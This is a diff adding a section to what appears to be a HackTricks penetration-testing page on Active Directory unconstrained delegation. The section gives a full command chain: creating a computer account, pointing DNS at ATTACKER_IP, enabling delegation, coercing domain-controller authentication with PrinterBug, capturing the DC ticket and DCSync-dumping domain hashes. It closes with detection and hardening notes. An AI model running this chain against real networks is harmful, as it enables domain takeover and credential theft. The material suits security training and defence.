@@ -58,11 +58,109 @@ Find here other ways to **force an authentication:**
 printers-spooler-service-abuse.md
 {{#endref}}
 
+### Abusing Unconstrained Delegation with an attacker-created computer
+
+Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you can set the newly created computer to be trusted for unconstrained delegation and harvest inbound TGTs from privileged systems.
+
+High-level flow:
+
+1) Create a computer you control
+
+```bash
+# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
+addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
+```
+
+2) Make the fake hostname resolvable inside the domain
+
+```bash
+# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
+python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
+  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
+  -dns-ip <DC_IP> <DC_FQDN>
+```
+
+3) Enable Unconstrained Delegation on the attacker-controlled computer
+
+```bash
+# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
+# BloodyAD example
+bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
+```
+
+Why this works: with unconstrained delegation, the LSA on a delegation-enabled computer caches inbound TGTs. If you trick a DC or privileged server to authenticate to your fake host, its machine TGT will be stored and can be exported.
+
+4) Start krbrelayx in export mode and prepare the machine NT hash
+
+```bash
+# Compute NT hash (MD4 over UTF-16LE) of the machine account password
+python3 - << 'PY'
+password = '<Strong.Passw0rd>'
+import hashlib
+print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())
+PY
+# Launch krbrelayx to export any inbound TGTs
+python3 krbrelayx.py -hashes :<NT_HASH>
+```
+
+5) Coerce authentication from the DC/servers to your fake host
+
+```bash
+# netexec (CME fork) coerce_plus module supports multiple coercion vectors
+# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
+netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
+```
+
+krbrelayx will save ccache files when a machine authenticates, for example:
+
+```
+Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
+Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
+```
+
+6) Use the captured DC machine TGT to perform DCSync
+
+```bash
+# Create a krb5.conf for the realm (netexec helper)
+netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
+sudo tee /etc/krb5.conf < krb5.conf
+
+# Use the saved ccache to DCSync (netexec helper)
+KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
+  netexec smb <DC_FQDN> --use-kcache --ntds
+
+# Alternatively with Impacket (Kerberos from ccache)
+KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
+  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
+```
+
+Notes and requirements:
+
+- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
+- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
+- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
+- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
+
+Detection and hardening ideas:
+
+- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
+- Monitor for unusual DNS A-record additions in the domain zone.
+- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
+- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.
+
 ### Mitigation
 
 - Limit DA/Admin logins to specific services
 - Set "Account is sensitive and cannot be delegated" for privileged accounts.
 
+## References
+
+- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
+- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
+- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
+- krbrelayx: https://github.com/dirkjanm/krbrelayx
+- Impacket addcomputer.py: https://github.com/fortra/impacket
+- BloodyAD: https://github.com/CravateRouge/bloodyAD
+- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
